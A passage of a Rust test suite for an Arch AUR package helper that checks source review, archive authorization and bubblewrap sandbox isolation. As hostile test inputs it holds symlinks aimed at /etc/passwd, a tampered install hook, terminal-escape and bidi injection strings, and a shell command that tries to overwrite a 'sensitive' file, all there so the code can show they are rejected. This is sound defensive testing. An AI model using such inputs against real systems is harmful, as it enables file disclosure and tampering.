    tokio::task::yield_now().await;
    std::fs::write(
        &srcinfo,
        "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\nsource = https://example.org/replacement.tar.gz\nsource = git+https://example.org/replacement.git\npkgname = demo\n",
    )
    .expect("write the replacement checkout manifest");

    Ok((directory, reviewed))
}

#[tokio::test]
async fn reviewed_http_prefetch_uses_captured_metadata_after_checkout_changes() -> Result<()> {
    let (_directory, reviewed) = replaced_reviewed_source_fixture().await?;
    let http = http_sources(reviewed.required_srcinfo("demo")?.as_ref());
    assert_eq!(http[0].url, "https://example.org/reviewed.tar.gz");
    Ok(())
}

#[tokio::test]
async fn reviewed_vcs_prefetch_uses_captured_metadata_after_checkout_changes() -> Result<()> {
    let (_directory, reviewed) = replaced_reviewed_source_fixture().await?;
    let vcs = vcs_sources(reviewed.required_srcinfo("demo")?.as_ref());
    assert_eq!(vcs[0].url, "https://example.org/reviewed.git");
    Ok(())
}

#[test]
fn contained_license_symlink_is_reviewed_by_target() -> Result<()> {
    let directory = tempfile::tempdir()?;
    std::fs::write(directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
    std::fs::write(directory.path().join(".SRCINFO"), "pkgbase = demo\n")?;
    std::fs::write(directory.path().join("LICENSE"), "0BSD\n")?;
    std::fs::create_dir(directory.path().join("LICENSES"))?;
    std::os::unix::fs::symlink("../LICENSE", directory.path().join("LICENSES/0BSD.txt"))?;

    let source = ReviewedSource::capture(directory.path())?;
    source.verify(directory.path())?;
    assert!(source.files.contains_key(Path::new("LICENSES/0BSD.txt")));
    Ok(())
}

#[test]
fn live_antigravity_checkout_is_reviewable_when_present() -> Result<()> {
    let path =
        PathBuf::from(std::env::var("HOME").unwrap_or_default()).join(".cache/omg/aur/antigravity");
    if !path.join("PKGBUILD").is_file() {
        return Ok(());
    }
    ReviewedSource::capture(&path).with_context(|| format!("capture {}", path.display()))?;
    Ok(())
}

#[test]
fn escaping_and_absolute_source_symlinks_are_rejected() -> Result<()> {
    let directory = tempfile::tempdir()?;
    std::fs::write(directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
    std::fs::write(directory.path().join(".SRCINFO"), "pkgbase = demo\n")?;
    std::os::unix::fs::symlink("../../etc/passwd", directory.path().join("escape"))?;
    let error = ReviewedSource::capture(directory.path()).expect_err("escape");
    assert!(
        error.to_string().contains("escapes the checkout"),
        "{error}"
    );

    std::fs::remove_file(directory.path().join("escape"))?;
    std::os::unix::fs::symlink("/etc/passwd", directory.path().join("absolute"))?;
    let error = ReviewedSource::capture(directory.path()).expect_err("absolute");
    assert!(error.to_string().contains("must be relative"), "{error}");
    Ok(())
}

#[test]
fn pkgbuild_symlink_is_rejected() -> Result<()> {
    let directory = tempfile::tempdir()?;
    std::fs::write(directory.path().join("real-pkgbuild"), "pkgname=demo\n")?;
    std::fs::write(directory.path().join(".SRCINFO"), "pkgbase = demo\n")?;
    std::os::unix::fs::symlink("real-pkgbuild", directory.path().join("PKGBUILD"))?;
    let error = ReviewedSource::capture(directory.path()).expect_err("pkgbuild link");
    assert!(
        error.to_string().contains("must be a regular file"),
        "{error}"
    );
    Ok(())
}

#[test]
fn vcs_version_changes_are_authorized_only_for_fresh_outputs() -> Result<()> {
    let directory = tempfile::tempdir()?;
    std::fs::write(
        directory.path().join("PKGBUILD"),
        "pkgname=demo\npkgver() { echo 2; }\n",
    )?;
    std::fs::write(
        directory.path().join(".SRCINFO"),
        "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\n",
    )?;
    let source = ReviewedSource::capture(directory.path())?;
    let archive_dir = private_fixture_dir()?;
    let archive = archive_dir.path().join("demo-2-1-any.pkg.tar.gz");
    write_pkg_archive(
        &archive,
        "pkgname = demo\npkgbase = demo\npkgver = 2-1\n",
        None,
    );
    let paths = [archive];
    let outputs = ["demo".to_owned()];
    assert!(AurClient::authorize_archives(&paths, &source, "demo", &outputs, true).is_ok());
    assert!(AurClient::authorize_archives(&paths, &source, "demo", &outputs, false).is_err());
    Ok(())
}

#[test]
fn historical_rebuild_version_must_predate_the_installed_package() -> Result<()> {
    let installed =
        crate::package_managers::types::parse_version("2:3-1").expect("fixture package version");
    let validate =
        |version| AurClient::check_rebuilt_rollback_version("demo", version, Some(&installed));
    validate("2:2-1")?;
    for version in ["2:3-1", "2:3-2", "3:1-1"] {
        let error = validate(version).expect_err("a rollback must not reinstall or upgrade");
        assert!(error.to_string().contains("not older than installed"));
    }
    AurClient::check_rebuilt_rollback_version("demo", "2-1", None)?;
    assert!(validate("2\0").is_err());
    Ok(())
}

#[test]
fn reviewed_source_and_fresh_archive_share_one_authorization_boundary() -> Result<()> {
    let directory = tempfile::tempdir()?;
    std::fs::write(
        directory.path().join("PKGBUILD"),
        "pkgname=demo\npkgver=1\n",
    )?;
    std::fs::write(
        directory.path().join(".SRCINFO"),
        "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\ninstall = demo.install\npkgname = demo\n",
    )?;
    std::fs::write(
        directory.path().join("demo.install"),
        "post_install() { :; }\n",
    )?;
    let source = ReviewedSource::capture(directory.path())?;
    let archive_dir = private_fixture_dir()?;
    let archive = archive_dir.path().join("demo-1-1-any.pkg.tar.gz");
    // write_pkg_archive supplies the fixture's single `arch = any` field.
    let info = "pkgname = demo\npkgbase = demo\npkgver = 1-1\n";
    write_pkg_archive(&archive, info, Some("post_install() { :; }\n"));
    let accepted = AurClient::authorize_archives(
        std::slice::from_ref(&archive),
        &source,
        "demo",
        &["demo".to_owned()],
        true,
    )?;
    write_pkg_archive(&archive, info, Some("post_install() { evil; }\n"));
    assert!(
        AurClient::authorize_archives(
            std::slice::from_ref(&archive),
            &source,
            "demo",
            &["demo".to_owned()],
            true
        )
        .is_err()
    );
    // The previously approved snapshot still carries the original bytes.
    let identity = AurClient::cached_archive_identity(Path::new(&accepted[0].handoff()))?.unwrap();
    assert_eq!(
        identity.install_script.as_deref(),
        Some("post_install() { :; }\n")
    );
    std::fs::write(directory.path().join("demo.install"), "changed")?;
    assert!(source.verify(directory.path()).is_err());
    assert!(
        AurClient::authorize_archives(&[], &source, "demo", &["demo".to_owned()], true).is_err()
    );
    Ok(())
}

#[tokio::test]
async fn native_child_cannot_gain_new_privileges() -> Result<()> {
    // Exercise the real setpriv boundary without sudo or package mutation.
    let output = Command::new(crate::core::privilege::root_controlled_program_path(
        "setpriv",
    )?)
    .args(["--no-new-privs", "--", "/usr/bin/cat", "/proc/self/status"])
    .output()
    .await?;
    assert!(output.status.success());
    assert!(String::from_utf8(output.stdout)?.contains("NoNewPrivs:\t1"));
    let command = native_build_command()?;
    assert!(
        command
            .as_std()
            .get_args()
            .any(|argument| argument == "--no-new-privs")
    );
    Ok(())
}

#[test]
fn chroot_launchers_detach_before_starting_devtools() -> Result<()> {
    for (helper, arguments) in [
        (
            "pkgctl",
            vec!["-w", "--", "/usr/bin/pkgctl", "build", "--clean"],
        ),
        (
            "makechrootpkg",
            vec![
                "-w",
                "--",
                "/usr/bin/makechrootpkg",
                "-r",
                "/var/lib/archbuild",
                "--",
            ],
        ),
    ] {
        let command = chroot_build_command(true, |name| {
            anyhow::ensure!(
                name == "setsid" || name == helper,
                "unavailable fixture tool"
            );
            Ok(Path::new("/usr/bin").join(name))
        })?;
        let command = command.as_std();
        assert_eq!(command.get_program(), "/usr/bin/setsid");
        assert!(
            command
                .get_args()
                .eq(arguments.into_iter().map(std::ffi::OsStr::new))
        );
    }
    let unavailable = chroot_build_command(true, |name| {
        assert_eq!(name, "setsid");
        anyhow::bail!("session launcher unavailable")
    });
    assert!(unavailable.is_err());
    let unavailable = chroot_build_command(false, |name| {
        anyhow::ensure!(name == "setsid", "devtools unavailable in fixture");
        Ok(PathBuf::from("/usr/bin/setsid"))
    })
    .expect_err("chroot builds require a devtools launcher");
    assert!(
        unavailable
            .to_string()
            .contains("Chroot build requires devtools")
    );
    Ok(())
}

#[test]
fn aur_rpc_error_envelope_is_not_an_empty_success() {
    let error = decode_aur_rpc_body::<AurResponse>(
        br#"{"type":"error","error":"Incorrect request type specified.","results":"malformed"}"#,
    )
    .expect_err("AUR RPC error envelopes must fail");

    assert!(
        error
            .to_string()
            .contains("Incorrect request type specified.")
    );
}

#[test]
fn aur_rpc_success_envelope_still_decodes() {
    let response =
        decode_aur_rpc_body::<AurResponse>(br#"{"type":"search","resultcount":0,"results":[]}"#)
            .expect("valid AUR RPC response");

    assert!(response.results.is_empty());
    let response = decode_aur_rpc_body::<AurResponse>(&s72_rpc_json(&[("aur-demo", "2.0-1")]))
        .expect("valid nonempty AUR RPC response");
    let identities: Vec<_> = response
        .results
        .iter()
        .map(|package| (package.name.as_str(), package.version.as_str()))
        .collect();
    assert_eq!(identities, [("aur-demo", "2.0-1")]);
}

#[test]
fn aur_rpc_http_error_uses_redacted_endpoint() {
    let error = ensure_aur_rpc_success(reqwest::StatusCode::SERVICE_UNAVAILABLE)
        .expect_err("non-success statuses must fail");
    let message = error.to_string();

    assert!(message.contains("503 Service Unavailable"));
    assert!(message.contains(AUR_RPC_URL));
    assert!(!message.contains("arg="));
}

fn private_fixture_dir() -> std::io::Result<tempfile::TempDir> {
    tempfile::Builder::new()
        .permissions(std::fs::Permissions::from_mode(0o700))
        .tempdir()
}

fn write_tar_gz(path: &std::path::Path, entries: &[(&str, &[u8])]) {
    let encoder = flate2::write::GzEncoder::new(
        std::fs::OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .mode(0o600)
            .open(path)
            .unwrap(),
        flate2::Compression::fast(),
    );
    let mut tar = tar::Builder::new(encoder);
    for (name, content) in entries {
        let mut header = tar::Header::new_gnu();
        header.set_size(content.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        tar.append_data(&mut header, name, *content).unwrap();
    }
    tar.into_inner().unwrap().finish().unwrap();
}

#[test]
fn pkginfo_parser_tolerates_partial_metadata_and_rejects_duplicate_keys() {
    assert_eq!(
        AurClient::parse_pkginfo_name_version("pkgname = example\npkgver = 1.0-1\n"),
        Some(("example".to_string(), "1.0-1".to_string()))
    );
    // Reject parser ambiguity rather than choosing an occurrence.
    assert_eq!(
        AurClient::parse_pkginfo_name_version(
            "pkgname = first\npkgname = second\npkgver = a\npkgver = b\n"
        ),
        None
    );
    // Missing either required key fails closed.
    assert_eq!(
        AurClient::parse_pkginfo_name_version("pkgname = example\n"),
        None
    );
    assert_eq!(
        AurClient::parse_pkginfo_name_version("pkgver = 1.0-1\n"),
        None
    );
    assert_eq!(
        AurClient::parse_pkginfo_name_version("desc = other stuff\n"),
        None
    );
    // Value trimming is part of the tolerated surface.
    assert_eq!(
        AurClient::parse_pkginfo_name_version("  pkgname =   spaced  \n pkgver =  2.0 \n"),
        Some(("spaced".to_string(), "2.0".to_string()))
    );
}

fn write_discovery_archive(directory: &Path, filename_name: &str, pkgname: &str) -> PathBuf {
    let path = directory.join(format!("{filename_name}-1-1-any.pkg.tar.zst"));
    let encoder = zstd::Encoder::new(File::create(&path).unwrap(), 0).unwrap();
    let mut archive = tar::Builder::new(encoder);
    let info = format!("pkgname = {pkgname}\npkgver = 1-1\narch = any\n");
    let mut header = tar::Header::new_gnu();
    header.set_size(info.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    archive
        .append_data(&mut header, ".PKGINFO", info.as_bytes())
        .unwrap();
    archive.into_inner().unwrap().finish().unwrap();
    path
}

#[tokio::test]
async fn built_package_discovery_accepts_requested_debug_named_output() {
    let directory = tempfile::tempdir().unwrap();
    for name in ["docker-debug", "docker-debug-tools"] {
        let archive = write_discovery_archive(directory.path(), name, name);
        assert_eq!(
            AurClient::find_built_packages(directory.path(), directory.path(), &[name.to_string()])
                .await
                .unwrap(),
            vec![archive]
        );
    }
}

#[tokio::test]
async fn built_package_discovery_accepts_requested_debug_named_split_outputs() {
    let directory = tempfile::tempdir().unwrap();
    let main = write_discovery_archive(directory.path(), "docker", "docker");
    let debug = write_discovery_archive(directory.path(), "docker-debug", "docker-debug");
    write_discovery_archive(directory.path(), "docker-debug-debug", "docker-debug-debug");
    assert_eq!(
        AurClient::find_built_packages(
            directory.path(),
            directory.path(),
            &["docker-debug".to_string(), "docker".to_string()],
        )
        .await
        .unwrap(),
        vec![debug, main]
    );
}

#[tokio::test]
async fn built_package_discovery_does_not_add_unrequested_debug_outputs() {
    let directory = tempfile::tempdir().unwrap();
    write_discovery_archive(directory.path(), "docker-debug", "docker-debug");
    let requested = ["docker".to_string()];
    assert!(
        AurClient::find_built_packages(directory.path(), directory.path(), &requested)
            .await
            .is_err()
    );
    let main = write_discovery_archive(directory.path(), "docker", "docker");
    assert_eq!(
        AurClient::find_built_packages(directory.path(), directory.path(), &requested)
            .await
            .unwrap(),
        vec![main]
    );
}

#[test]
fn built_package_discovery_rejects_mismatched_debug_named_identity() {
    let directory = tempfile::tempdir().unwrap();
    write_discovery_archive(directory.path(), "docker-debug", "unrelated");
    assert_eq!(
        AurClient::find_package_in_dir(directory.path(), &["docker-debug".to_string()]),
        None
    );
}

#[test]
fn built_package_discovery_rejects_unreadable_archive_identity() {
    let directory = tempfile::tempdir().unwrap();
    let archive = directory.path().join("requested-1.0-1-x86_64.pkg.tar.zst");
    std::fs::write(&archive, b"not a package archive").unwrap();

    assert_eq!(
        AurClient::find_package_in_dir(directory.path(), &["requested".to_string()]),
        None
    );
}

#[test]
fn build_only_rejects_cached_archives_with_mismatched_identity() {
    let directory = tempfile::tempdir().unwrap();
    let pkg_dir = directory.path().join("pkg");
    std::fs::create_dir(&pkg_dir).unwrap();
    std::fs::write(
        pkg_dir.join(".SRCINFO"),
        "pkgbase = requested\npkgver = 1.0\npkgrel = 1\n\npkgname = requested\n",
    )
    .unwrap();
    let archive = directory.path().join("requested.pkg.tar.gz");
    write_tar_gz(
        &archive,
        &[(".PKGINFO", b"pkgname = different\npkgver = 1.0-1\n")],
    );

    assert_eq!(
        AurClient::select_cached_artifacts(
            vec![archive],
            &["requested".to_string()],
            &pkg_dir,
            "requested"
        ),
        None
    );
}

#[test]
fn archive_identity_reader_requires_a_readable_root_pkginfo() {
    let directory = tempfile::tempdir().unwrap();

    let with_pkginfo = directory.path().join("with.pkg.tar.gz");
    write_tar_gz(
        &with_pkginfo,
        &[(".PKGINFO", b"pkgname = example\npkgver = 1.0-1\n")],
    );
    assert_eq!(
        AurClient::pkg_name_and_version_from_archive(&with_pkginfo),
        Some(("example".to_string(), "1.0-1".to_string()))
    );

    // Corrupt gzip fails closed instead of yielding an identity.
    let corrupt = directory.path().join("corrupt.pkg.tar.gz");
    std::fs::write(&corrupt, b"not a gzip archive").unwrap();
    assert_eq!(AurClient::pkg_name_and_version_from_archive(&corrupt), None);

    // An archive without .PKGINFO cannot claim any identity.
    let empty = directory.path().join("empty.pkg.tar.gz");
    write_tar_gz(&empty, &[]);
    assert_eq!(AurClient::pkg_name_and_version_from_archive(&empty), None);

    // PKGINFO-like entries nested deeper than two components are ignored.
    let deep = directory.path().join("deep.pkg.tar.gz");
    write_tar_gz(
        &deep,
        &[("a/b/.PKGINFO", b"pkgname = deep\npkgver = 9.9\n")],
    );
    assert_eq!(AurClient::pkg_name_and_version_from_archive(&deep), None);

    // Metadata is untrusted and must not cause unbounded allocation.
    let oversized = directory.path().join("oversized.pkg.tar.gz");
    let mut pkginfo = b"pkgname = oversized\npkgver = 1.0-1\n".to_vec();
    pkginfo.resize((MAX_PKGINFO_BYTES + 1) as usize, b'x');
    write_tar_gz(&oversized, &[(".PKGINFO", &pkginfo)]);
    assert_eq!(
        AurClient::pkg_name_and_version_from_archive(&oversized),
        None
    );
}

#[test]
fn xz_package_metadata_scan_enforces_decompressed_budget() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("oversized.pkg.tar.xz");
    let content = vec![b'x'; 1024];
    let mut tar = tar::Builder::new(Vec::new());
    let mut header = tar::Header::new_gnu();
    header.set_size(content.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    tar.append_data(&mut header, "payload", content.as_slice())
        .unwrap();
    let raw = tar.into_inner().unwrap();
    let mut compressed = Vec::new();
    lzma_rs::xz_compress(&mut raw.as_slice(), &mut compressed).unwrap();
    std::fs::write(&path, compressed).unwrap();

    let error = AurClient::package_archive_reader(&path, 128)
        .err()
        .expect("oversized XZ output must fail before it is retained in memory");
    assert!(
        error.to_string().contains("xz"),
        "unexpected error: {error:#}"
    );
}

#[test]
fn sandbox_launcher_uses_bwrap_directly_and_detaches_the_tty() {
    let command = sandbox_command_with(Path::new("/home/builder"), "builder", |_| {
        Ok(PathBuf::from("/usr/bin/bwrap"))
    })
    .unwrap();
    let command = command.as_std();
    let args: Vec<_> = command.get_args().collect();

    assert!(Path::new(command.get_program()).is_absolute());
    assert_eq!(
        Path::new(command.get_program()).file_name().unwrap(),
        "bwrap"
    );
    assert!(args.contains(&"--new-session".as_ref()));
    assert!(args.contains(&"--die-with-parent".as_ref()));
    assert!(args.contains(&"--unshare-pid".as_ref()));
    assert!(!args.contains(&"setsid".as_ref()));
}

#[cfg(target_os = "linux")]
fn spawn_logged_sandbox_fixture(
    client: AurClient,
    mut command: Command,
    package: &'static str,
) -> tokio::task::JoinHandle<Result<std::process::ExitStatus>> {
    tokio::spawn(async move {
        client
            .run_logged_build_command(&mut command, package, BuildIsolation::ProcessGroup)
            .await
    })
}

#[cfg(target_os = "linux")]
async fn logged_sandbox_fixture_readiness(
    listener: &tokio::net::TcpListener,
    runner: &mut tokio::task::JoinHandle<Result<std::process::ExitStatus>>,
    log_path: &Path,
) -> tokio::net::TcpStream {
    tokio::select! {
        result = tokio::time::timeout(Duration::from_secs(5), listener.accept()) => {
            result.expect("build child must signal readiness").expect("accept readiness").0
        }
        result = runner => {
            let log = std::fs::read_to_string(log_path).unwrap_or_default();
            panic!("sandbox exited before child readiness: {result:?}\nlog:\n{log}");
        }
    }
}

#[cfg(target_os = "linux")]
#[tokio::test]
#[ignore = "requires bubblewrap and permission to create PID namespaces"]
async fn cancelling_logged_sandbox_build_terminates_descendants() {
    use futures::FutureExt as _;
    use rustix::process::{Pid, PidfdFlags, Signal, pidfd_open, pidfd_send_signal};
    use tokio::io::{AsyncBufReadExt, unix::AsyncFd};

    let directory = tempfile::tempdir().expect("isolated build logs");
    let client = AurClient {
        build_dir: directory.path().to_path_buf(),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port().to_string();
    let log_path = client.build_log_path("fixture");
    let early_log = client.build_log_path("early-fixture");
    let spawn_early_exit = |package| {
        let mut command = Command::new("/bin/sh");
        command.args(["-c", "printf 'early-exit-fixture\\n'; exit 23"]);
        spawn_logged_sandbox_fixture(client.clone(), command, package)
    };
    let mut completed = spawn_early_exit("early-completion");
    let _abort_completed = scopeguard::guard(completed.abort_handle(), |handle| handle.abort());
    let status = tokio::time::timeout(Duration::from_secs(5), &mut completed)
        .await
        .expect("early-exit control must finish promptly")
        .expect("early-exit build task must not panic")
        .expect("early-exit build command must run");
    assert_eq!(status.code(), Some(23));

    let mut early_runner = spawn_early_exit("early-fixture");
    let _abort_early = scopeguard::guard(early_runner.abort_handle(), |handle| handle.abort());
    let failure = std::panic::AssertUnwindSafe(logged_sandbox_fixture_readiness(
        &listener,
        &mut early_runner,
        &early_log,
    ))
    .catch_unwind()
    .await
    .expect_err("a build that exits before readiness must fail the fixture");
    let diagnostic = failure
        .downcast_ref::<String>()
        .expect("readiness diagnostic");
    assert!(diagnostic.contains("sandbox exited before child readiness"));
    assert!(diagnostic.contains("early-exit-fixture"));
    assert!(early_runner.is_finished());

    let mut command = sandbox_command(directory.path(), "builder").unwrap();
    // Keep the host /proc mount so the child can report its host PID after
    // PID isolation. Production mounts a fresh /proc instead. Do not bind
    // the whole host root: a read-only /dev makes `cmd &` fail opening
    // /dev/null, and Docker cgroup mounts break --ro-bind / /. A socket
    // provides readiness and bounds the child's lifetime if setup fails.
    command.args([
        "--ro-bind",
        "/usr",
        "/usr",
        "--ro-bind",
        "/lib",
        "/lib",
        "--ro-bind",
        "/lib64",
        "/lib64",
        "--symlink",
        "/usr/bin",
        "/bin",
        "--ro-bind",
        "/proc",
        "/proc",
        "--dev",
        "/dev",
        "--",
        "/bin/bash",
        "-c",
    ]);
    command.arg(
        r#"/bin/bash -c '
                exec 3<>/dev/tcp/127.0.0.1/"$1" || exit 1
                read -r host_pid rest < /proc/self/stat
                printf "%s\n" "$host_pid" >&3
                read -r -t 30 finish <&3
            ' child "$1" & wait"#,
    );
    command.arg("build").arg(port).stdin(Stdio::null());
    let mut runner = spawn_logged_sandbox_fixture(client, command, "fixture");
    let _abort_runner = scopeguard::guard(runner.abort_handle(), |handle| handle.abort());
    let stream = logged_sandbox_fixture_readiness(&listener, &mut runner, &log_path).await;
    let mut readiness = tokio::io::BufReader::new(stream);
    let mut pid = String::new();
    tokio::time::timeout(Duration::from_secs(5), readiness.read_line(&mut pid))
        .await
        .unwrap()
        .unwrap();
    let pid =
        Pid::from_raw(pid.trim().parse().expect("child host PID")).expect("nonzero child PID");
    // SAFETY: AsyncFd owns the pidfd, which is never replaced or closed independently.
    #[expect(
        unsafe_code,
        reason = "Tokio requires an explicit ownership proof for AsyncFd registration"
    )]
    let exit =
        unsafe { AsyncFd::register(pidfd_open(pid, PidfdFlags::NONBLOCK).unwrap()).unwrap() };
    let _cleanup_child = scopeguard::guard(&exit, |exit| {
        // The failed regression must not leak its fixture. A pidfd
        // cannot accidentally signal an unrelated process after PID reuse.
        let _ = pidfd_send_signal(exit.get_ref(), Signal::KILL);
    });

    runner.abort();
    assert!(
        runner
            .await
            .expect_err("runner must be cancelled")
            .is_cancelled()
    );
    let _exited = tokio::time::timeout(Duration::from_secs(2), exit.readable())
        .await
        .expect("cancelling a sandbox build must terminate its compiler descendants")
        .expect("observe child exit");
}

#[test]
fn sandbox_mounts_external_resolver_target() {
    let resolver = std::fs::canonicalize("/etc/resolv.conf").unwrap();
    if resolver.starts_with("/etc") {
        return;
    }

    let mut command = Command::new("bwrap");
    configure_sandbox_resolver(&mut command).unwrap();
    let args: Vec<_> = command.as_std().get_args().collect();

    assert!(args.contains(&resolver.as_os_str()));
    assert!(
        resolver
            .parent()
            .is_some_and(|parent| args.contains(&parent.as_os_str()))
    );
}

/// A host without a usable resolver (container, chroot, dangling
/// /etc/resolv.conf symlink) must not fail every AUR build at sandbox
/// setup; there is simply nothing to mount.
#[test]
fn sandbox_resolver_setup_skips_when_the_host_has_no_resolver() {
    let temp = tempfile::tempdir().unwrap();

    let missing = temp.path().join("resolv.conf");
    let mut command = Command::new("bwrap");
    configure_sandbox_resolver_at(&mut command, &missing).unwrap();
    assert_eq!(command.as_std().get_args().count(), 0);

    // Same for a dangling symlink (e.g. points into an unmounted /run).
    let dangling = temp.path().join("dangling");
    std::os::unix::fs::symlink(temp.path().join("unmounted/run/resolv.conf"), &dangling).unwrap();
    let mut command = Command::new("bwrap");
    configure_sandbox_resolver_at(&mut command, &dangling).unwrap();
    assert_eq!(command.as_std().get_args().count(), 0);
}

/// Verify that bubblewrap's read-only root bind blocks writes outside
/// the writable mounts our sandbox configures.
///
/// This tests bwrap itself with representative args, NOT the production
/// argument list built by `run_sandboxed_makepkg` (which cannot be run
/// hermetically in a unit test). The production args are covered by the
/// path-validation unit tests (`validate_path_inside`, `is_symlink`).
#[tokio::test]
async fn bwrap_readonly_root_blocks_arbitrary_writes() {
    // We can't call run_sandboxed_makepkg directly without a full build
    // environment, so exercise bwrap's ro-bind guarantee directly.

    let bwrap_path = which::which("bwrap");
    if bwrap_path.is_err() {
        println!("Skipping sandbox test: bubblewrap not installed");
        return;
    }

    // Create a dummy file to try to overwrite
    let temp_dir = tempfile::TempDir::new().unwrap();
    let sensitive_file = temp_dir.path().join("sensitive.txt");
    std::fs::write(&sensitive_file, "secret").unwrap();

    // Keep the fixture visible: a fresh /tmp would hide its parent and
    // make ENOENT look like a successful read-only-mount regression.
    // The writable control must execute the same shell and write first.
    for readonly in [false, true] {
        std::fs::write(&sensitive_file, "secret").unwrap();
        let output = Command::new("bwrap")
            .args([
                if readonly { "--ro-bind" } else { "--bind" },
                "/",
                "/",
                "--dev",
                "/dev",
                "--proc",
                "/proc",
                "--setenv",
                "LC_ALL",
                "C",
                "--",
                "/bin/sh",
                "-eu",
                "-c",
                "cat -- \"$1\"; printf hacked > \"$1\"",
                "readonly-fixture",
            ])
            .arg(&sensitive_file)
            .output()
            .await
            .unwrap();
        assert_eq!(output.stdout, b"secret", "fixture must be readable");
        let stderr = String::from_utf8_lossy(&output.stderr);
        if readonly {
            assert!(!output.status.success(), "read-only write succeeded");
            assert!(stderr.contains("Read-only file system"), "{stderr}");
            assert_eq!(std::fs::read(&sensitive_file).unwrap(), b"secret");
        } else {
            assert!(output.status.success(), "writable control failed: {stderr}");
            assert_eq!(std::fs::read(&sensitive_file).unwrap(), b"hacked");
        }
    }
}

#[tokio::test]
async fn sandbox_fakeroot_skips_unmappable_real_chown() {
    use std::os::unix::fs::{MetadataExt, PermissionsExt};

    if which::which("bwrap").is_err() || which::which("fakeroot").is_err() {
        return;
    }

    let temp = tempfile::Builder::new()
        .permissions(std::fs::Permissions::from_mode(0o700))
        .tempdir()
        .unwrap();
    let source = temp.path().join("source");
    let destination = temp.path().join("destination");
    std::fs::create_dir_all(source.join("nested")).unwrap();
    std::fs::create_dir_all(&destination).unwrap();
    std::fs::write(source.join("nested/file"), "payload").unwrap();

    let host_uid = nix::unistd::geteuid().as_raw();
    let host_gid = nix::unistd::getegid().as_raw();
    // CI already permits container-root namespace setup. Mapping that
    // creator to a nonzero sandbox UID keeps namespace root unmapped,
    // without requiring the host to permit unprivileged userns setup.
    // Drop all payload capabilities and prove real chown still fails.
    // This models the confined payload, not the host policy governing
    // whether an unprivileged caller may launch bubblewrap itself.
    let (uid, gid) = if host_uid == 0 {
        let account = nix::unistd::User::from_name("nobody")
            .unwrap()
            .expect("root fakeroot regression requires a nobody account");
        (account.uid.as_raw(), account.gid.as_raw())
    } else {
        (host_uid, host_gid)
    };
    assert_ne!(uid, 0, "fakeroot payload must have a nonzero namespace UID");
    let mut command = Command::new("bwrap");
    command
        .arg("--unshare-user")
        .arg("--uid")
        .arg(uid.to_string())
        .arg("--gid")
        .arg(gid.to_string())
        .args(["--cap-drop", "ALL"]);
    command.args([
        "--clearenv",
        "--ro-bind",
        "/",
        "/",
        "--tmpfs",
        "/tmp",
        "--bind",
    ]);
    command.arg(temp.path()).arg(temp.path());
    command.args(["--chdir"]);
    command.arg(temp.path());
    command.args([
        "--setenv",
        "PATH",
        "/usr/local/sbin:/usr/local/bin:/usr/bin",
        "--setenv",
        SANDBOX_FAKEROOT_ENV.0,
        SANDBOX_FAKEROOT_ENV.1,
        "--",
        "sh",
        "-eu",
        "-c",
        concat!(
            "test \"$(id -u)\" != 0; ",
            "test \"$(id -g)\" != 0; ",
            "grep -Eq \"^CapEff:[[:space:]]+0+$\" /proc/self/status; ",
            "grep -Eq \"^CapPrm:[[:space:]]+0+$\" /proc/self/status; ",
            "cat /proc/self/uid_map; ",
            "awk -v uid=\"$(id -u)\" ",
            "'NR == 1 { if ($1 != uid || $3 != 1) exit 1 } ",
            "END { if (NR != 1) exit 1 }' /proc/self/uid_map; ",
            "test \"$(cat source/nested/file)\" = payload; ",
            "printf control > destination/control; ",
            "owner=$(stat -c '%u:%g' source/nested/file); ",
            "if chown 0:0 source/nested/file; then ",
            "echo 'real chown unexpectedly succeeded' >&2; exit 1; fi; ",
            "test \"$(stat -c '%u:%g' source/nested/file)\" = \"$owner\"; ",
            "fakeroot sh -eu -c '",
            "chown -R 0:0 source; ",
            "test \"$(stat -c '%u:%g' source/nested/file)\" = 0:0; ",
            "cp -a source/. destination/copied; ",
            "test \"$(stat -c '%u:%g' destination/copied/nested/file)\" = 0:0'",
        ),
    ]);

    let status = command.status().await.unwrap();
    assert!(status.success());
    assert_eq!(
        std::fs::read(source.join("nested/file")).unwrap(),
        b"payload"
    );
    assert_eq!(
        std::fs::read(destination.join("control")).unwrap(),
        b"control"
    );
    for path in [
        source.join("nested/file"),
        destination.join("copied/nested/file"),
    ] {
        let metadata = std::fs::metadata(path).unwrap();
        assert_eq!((metadata.uid(), metadata.gid()), (host_uid, host_gid));
    }
    assert_eq!(
        std::fs::read_to_string(destination.join("copied/nested/file")).unwrap(),
        "payload"
    );
}

#[test]
fn pkgbuild_review_is_bounded_and_terminal_safe() {
    let rendered = pkgbuild_review_text(b"pkgname=safe\n\x1b]52;c;secret\x07\n")
        .expect("small PKGBUILD must render");
    assert_eq!(rendered, "pkgname=safe\n]52;c;secret\n");

    let bidi = pkgbuild_review_text(b"pkgname=safe\n\xe2\x80\xaao\xe2\x81\xa7i\n")
        .expect("PKGBUILD with bidi characters must render");
    assert_eq!(bidi, "pkgname=safe\noi\n");

    let oversized = vec![b'x'; MAX_PKGBUILD_REVIEW_BYTES + 1];
    let error = pkgbuild_review_text(&oversized)
        .expect_err("oversized PKGBUILD must fail before terminal rendering");
    assert!(error.to_string().contains("review limit"));
}

#[test]
fn reviewed_source_rejects_symlinks_to_the_checkout_root_and_missing_entries() {
    let directory = tempfile::tempdir().expect("test directory");
    let root = directory.path();
    let link = root.join("link");
    let root_error = contained_aur_symlink_target(root, &link, Path::new("."))
        .expect_err("the checkout root is not a reviewed source entry");
    assert!(root_error.to_string().contains("escapes the checkout"));
    std::os::unix::fs::symlink("missing", &link).expect("dangling test symlink");
    let missing = contained_aur_symlink_target(root, &link, Path::new("missing"))
        .expect_err("a symlink needs an existing reviewed entry");
    assert!(
        missing
            .to_string()
            .contains("must resolve to a reviewed checkout entry")
    );
}

#[test]
